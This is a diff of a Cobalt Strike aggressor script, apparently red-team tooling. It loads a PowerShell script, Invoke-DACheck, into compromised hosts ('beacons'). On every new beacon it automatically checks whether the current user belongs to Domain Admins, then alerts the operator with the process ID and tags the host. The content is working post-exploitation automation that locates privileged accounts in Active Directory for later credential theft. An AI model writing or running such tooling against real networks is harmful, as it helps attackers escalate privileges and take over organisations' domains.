@@ -1,28 +1,46 @@
 # quickly run Powerview
 sub powerview {
-  bpowershell_import($1, script_resource("powerview.ps1"));
+  bpowershell_import($1, script_resource("Invoke-DACheck.ps1"));
 }
 
-alias getda {
+popup beacon {
+  # menu definitions above this point
+  insert_menu("view", $1);
+  
+  # menu definitions below this point
+}
+
+alias checkda {
   powerview($1);
-  bpowershell($1, '$a = Get-NetGroupMember -GroupName "Domain Admins"; $a.MemberName');
-  on beacon_output {
-    $s = replace($2, 'received output:\n'.'');
-    println($s);
-    break;
-  }
+  bpowershell($1, 'Invoke-DACheck');
 }
 
 # register the GetDa command
 beacon_command_register(
-  "getda", 
-  "Gathers the DA list of users", 
-  "Synopsis: echo [arguments]\n\nLog arguments to the beacon console");
+  "checkda", 
+  "Checks if the current user is in the DA Group", 
+  "Synopsis: echo [no arguments]\n\nChecks using Powershell that supports (2.0 or later with 3.5 .NET) \n or (PS 4.0 or later) to perform Domain Group queries.");
 
 # set up the Initial check
 on beacon_initial {
-  bsleep($1, 0, 0);
+  powerview($1);
+  bpowershell($1, 'Invoke-DACheck');
 }
+
+# set up event consumer to search for specfic pattern
+# if found alert them via Elog and box
+on beacon_output {
+    $s = replace($2, 'received output:\n'.'');
+    println($s);
+    $f = "Found-DA-User:";
+    if ($f isin $s)
+      {
+      $pid = binfo($1, "pid");
+      elog("Found DA User at Pid: $pid");
+      show_message("Found DA User at Pid: $pid");
+      beacon_note($1, "DA User on this box");
+      }
+  }
 
 #  bpowershell($1, '$user = [Security.Principal.WindowsIdentity]::GetCurrent();(New-Object Security.Principal.
 #  WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)');
